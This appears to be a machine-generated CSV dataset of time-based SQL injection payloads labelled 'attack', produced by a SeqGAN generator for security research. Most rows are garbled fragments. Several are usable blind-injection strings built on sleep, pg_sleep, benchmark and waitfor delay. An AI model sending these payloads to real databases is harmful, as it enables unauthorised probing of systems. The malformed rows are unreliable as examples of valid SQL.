label,payload,family,payload_type,method,run_id,sample_index
attack,"1%"" as )n d 4240 jdudelk  (  sleep  (  5   )    )       )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1655
attack,"""   where 8507u where 3885  =  benchmark  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1656
attack,"; if 8466  =  6223 sleep  (  5000000,mrdvmdpu  )fand   )    )   asrlikelib8594 from 8594 from pg_sleep  (  'isintegratedsecurityonly'   )    )     )are   z    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1657
attack,"""   )    )     )   or and   (  select (  __TIME__TIME__  )    d   (    (   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1658
attack,1'   )    )    as )     )  )  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1659
attack,1'   )    )    as_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1660
attack,"waitfor delay"" and sleep  (  5000000,md5  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1661
attack,"1""   )    )    as o",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1662
attack, (  select   (  select information_schema.charn where 9862  9862 and sleep  (  5  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1663
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baria7812",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1664
attack,1 or   ((  5   )    )     )  srmdpu    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1665
attack,1%'   )    )     )eefg,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1666
attack,    )    or 6793  =    (  'sysadmin'  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1667
attack, )    )   as gcdcr  s vlia,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1668
attack,"select sleep  (  5000000,md5  (  5   )    (    (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1669
attack,"1' or pg_sleep  (  5000000,md5  (  5  )   and   (  0x544d5a4c   )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1670
attack,"1"" rlike sleep  (  5   )    )     )  srmq  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1671
attack,1 where   (  =  )   y  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1672
attack,or 4240 vn where 3885  =  9862 elt  (  (  _TIMif hee where 8507  =  'dfzn,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1673
attack,1%'   )    asevm,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1674
attack,1'   )    )    asikahah and   )    q  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1675
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmf"" like ""mem",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1676
attack,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'ay,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1677
attack,"1%'%,apjxvigg"" like ""vjxifg",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1678
attack,1'   )    )    aserlcx'  =  ' or sleep  (  5   )    )   m)     gcrrprrer,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1679
attack,"""   )    )    agor pg_sleep  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1680
attack,"""  )   agand   (  'isintegratedsecurityonly'   )    )   as where 7629  =  fdm",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1681
attack,", (  5   )    )    andeds where 4871  =  ydfznono  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1682
attack,""" and pg_sleep  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1683
attack,1%' and  (  select srmy_TIMrjrpl,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1684
attack,"1"" or benchmark  (  5000000,md5  (  __   )    )     )   r",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1685
attack,   )    ase dubse duaid,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1686
attack, (  select sleep  (  5   )    )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1687
attack,select pg_sleep  (  5   )    )     o  yddfhd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1688
attack,", if 7165  =    (  select * from   (  5   (    (  select 4240 ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1689
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""ef""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1690
attack,select pg_sleep  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1691
attack,"""  )   ar rlike sleep  (  5000000,md5  (  substring   (    )    d rlike sleep  (  sleep  (  5000000,md5  (  9558",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1692
attack,"select benchmark  (  5  (  select ""lrudctfs",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1693
attack,"1delay,aonvqfan",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1694
attack,$  (  5000000  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1695
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1696
attack,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1697
attack,"1""   )    )    or sleep  (  10000000,MD5  (  __TIME__  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1698
attack,select benchmark  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1699
attack,"1mr'  =  'b""  =  ""elbag",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1700
attack,"""  )   as kddmdbmaoar",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1701
attack,1'   )    )    or sleep  (  5  )   and    (    (   'uzhdyvfpckzx    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1702
attack,1%'   )    )     )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1703
attack,; ru,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1704
attack,"1""'   )    )    aprlikee we rlik or sleep  (  1915bereyz  )   ydgd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1705
attack, )   1   and duuar cus,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1706
attack,1'||  (  select 'w,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1707
attack,"select (  sleep  (  5000000,md5  (  5  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1708
attack,1;  r rlike7360  (  5  )   and 8594rlentubzf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1709
attack, (  select 4240 8140  =  6784 2388klcn rl rli or 4240  =    and    (   select 6969  =  ve sleep  (  5   )    )   mdveemsasdmf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1710
attack,1%'   )    )    asememf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1711
attack,  (  _TIME__vo  )    ad,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1712
attack,"select pg_sleep  (  5000000,md5  0x6d457153   )    )    and   (  5   )    )     )  7165   end   )    )    and o  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1713
attack,", if 2679(  5   )    )     )  srmybdp prveel",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1714
attack,waitfor delay '0:0:2' when   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1715
attack,"1 and   (  5000000,xo",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1716
attack," )       ;elvhiyzn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1717
attack,"1'   )    )    rlike sleep  (  5  )   and    (    (   'iwwftw""  =  ""eybf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1718
attack,or sleep  (  5   )    )     )  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1719
attack,waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1720
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""t'  =  'w'  =  'iwcprt'  =  'wzx'  =  'rarwhere 2657  =  6456 rli where 4871  =  7360  =  1165 rlike sleep  (  __TIME__TIME__TIME__TIME__TIME__  )    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1721
attack,; if not  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1722
attack,"select benchmark  (  5000000,md5  (  'sysadmin'  (  5000000,md5  )   (  5000000,md5  (  sleep  (  10000000,24,8514  (  __TIME__TIMg",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1723
attack,select sleep  (  5   )    )     )  5   )    )     o,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1724
attack,"1%"" and   ) plt  (  _TIME__TIME_  (  select pg_sleepasrub",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1725
attack,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""evb'  =  'csirmy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1726
attack,"1'   )    )    aasese dbcusb""  =  ""eefga""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1727
attack,"1%""  )   as )   waitfor delay '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1728
attack,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1729
attack,1%'   )    )     )   as 2388s_snd5  (  5   )    )     gzrarojrd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1730
attack,select 8514  =  benchmark  (  'isintegratedsecurityonly'   )    )    asy,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1731
attack,selectpg_sleep  (  5  )   and   (  =  8036  )   bqn  )   y   (    (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1732
attack,",waitfor ""  (  'isintegratedsecurityonly'   )    )     )  )   where 4287 4240or 8514  =  benchmark  (  10000000,'mmvf'and 1915",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1733
attack,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioarf'  =  'bd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1734
attack,1%'   )    )    assezsrefm,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1735
attack,1  )   agalik.sleep  (  0x4c4d6142   )    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1736
attack,"""  )   as xv where 7165  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1737
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1738
attack,select sleep  (  5   )    )     )  srmdperprver,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1739
attack,"1%""  )   waitfor delay pg_sleep  (  5000000,md5  (   _  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1740
attack,"select or   (    (  5000000,md5  (  5   )    (    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1741
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twftag",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1742
attack,"1%""  )   as 5466 rlike%25, if delay 9856*  (  case 6767 sleep  (  5   )    )     )  6618",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1743
attack,; (  select *   (    (  select 6969 from 8514  =  benchmark  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1744
attack,1%' or   (  3114  select --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1745
attack,"""  )    or 8514  =  sleep  (  'sysadmin'  9558",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1746
attack,", if not  )   and  (  5  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1747
attack, )    )    or 8514(  sleep  (  5   )    (     )   mq  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1748
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1749
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1750
attack,"select benchmark  (  5000000,m(  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1751
attack,"1  )   and pg_sleep  (  5000000,md5  (  'isintegratedsecurityonly'   )    )   or   (  5   )    )     )   srmdprermerpertyemf5  (  5   )    )     )  srmbx",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1752
attack,"   )    )     ase_semervemfer""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1753
attack,"1',mybelvjrix""  =  ""ieiajag",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1754
attack," or 4240  =    )    and dcysnsmg""  =  ""eepfg",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1755
attack,waitfor (  =    (  select 6793 2388  =  benchmark  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1756
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""efg",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1757
attack,waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1758
attack,1%%'  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1759
attack,select benchmark  (  5   )    )     ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1760
attack,", if not   (    (  select md  5466 and ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1761
attack,"1'||  (  select 'siy"" like ""fx,",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1762
attack,select sleep  (  5   )    )     )  srmq  )   and   (  select  (  'sysadmin'  (  __TIME__  )   yd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1763
attack,1%delayselect and   (  select * from   (  select  (  'sysadmin'  )   mq  )   waitfor delay 7629  =  7360  )   end   (    (     (  5   )    )     )bmq  )   and   (  select elt  (  select  (  sleep  (       'nvqf'(  5   )    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1764
attack,1%'   )    asbp    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1765
attack,"1%"",and 8594 from 8466  sleep  (  __TIME__5  (  5   )    )   d   )    )   d where 9862 and   (  select  (  1210 rny)  sd5  (  __TIME__  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1766
attack,", if 0 where (  sleep  (  5000000,md5  (  5   )    )     )  9558",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1767
attack,"select sleep  (  10000000,MD5  (  __TIME__  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1768
attack,",waitfor delay information_schema*vl'  =  'w",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1769
attack,1   )    )    as_us,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1770
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""tdwmf_tf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1771
attack,1'||  (  select 'gx or sleep  (  substring   )    )     gcrerpul,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1772
attack,select * from   (  5   )    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1773
attack,"1"" waitfor delay '0:0:5' and ""dvfq    (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1774
attack,"1' waitfor delay '0:0:""%""  (  5   )    )     )  srmhar  )    andyy   )    )   asemseprvmed'  =  'b""  =  ""baryb""  =  ""e""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1775
attack,select pg_sleep  (  5   )    )     )  sdmq  sddos where 1547 rlike sleep  (  sleep  (  5   )    )    assemypzsteptmybxgq where 6175  )   sre x,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1776
attack,", if not  (  'isintegratedsecurityonly'   (  select  = ee sleep  (  5   )    )   d   )    )   ysubstringy   (    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1777
attack,",5 where 4871 and pg_sleep  (  5   )    )     )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1778
attack,1%; if or sleep  (  0x4c4d6142   )    )     )  veemd5  (  5  )   (bmq  ) ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1779
attack,"1%'%,a5  o    (  select rlike sleep  (  5000000,md5  (  1   )    )     )  )   ""  =  ""s_TIMcjrapavbjr'  =  'vcjrar'  =  'b""  =  ""arv",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1780
attack,1   )     )   as where not  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1781
attack,1 or   (  5   )    )   sr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1782
attack,select sleep  (  5  )   sr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1783
attack,1   )    )    or 8514  =  vwyq ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1784
attack,select sleep  (  5   )    )       ) d   )    )    and 8594  )    (    (   sleep  (  'isintegratedsecurityonly'   )    )    <>yby   (  0x6d457153   )   m)   d,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1785
attack,"select sleep  (  10000000,MD5  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1786
attack,"; if not  )   <> from   (  0x4c4d6142   )    )    and sersioareeefqvefg""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1787
attack,"""   )    )    as 'sa' where 8594  =    (  select 4240 from   (  select  =gd5  (  5  )   and ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1788
attack,select benchmark  (  5   )    )    )     )  )  d,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1789
attack,"select'%'  =    and    (    (    (   ""%""  =  1   and 'fdgq'  =  #and   (  select  (  _ E_  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1790
attack," )    )   as if benchmark  (  10000000,25  0x694a4745   )    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1791
attack,1'   )    )    as from x,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1792
attack,1'wzpwe'  =  'w,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1793
attack,; if not  0x76555642   )    )   as serverpy,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1794
attack,"; (  5   )    )     )  veeno  ) dTstdidijrag""  =  ""ijag""  =  ""igapaiy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1795
attack,1'   )    )    as#,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1796
attack,(  select benchmark  (  5   )    )     )   ermy  )   andyq  )   se ddduu where 6767 rlike sleep  (  5   )    )     )  srmq  )   rsiond  o  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1797
attack,waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1798
attack, )    )   ;waitfor delay (  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1799
attack,select sleep  (  5   )    )     sem(  if duedua,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1800
attack,"1'   )    )    or sleep  (  5  'isintegratedsecurityonly'   )    )  asrerfjrgjr'  =  'cjjztag""  =  ""b""  =  ""ibbar""  =  ""f",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1801
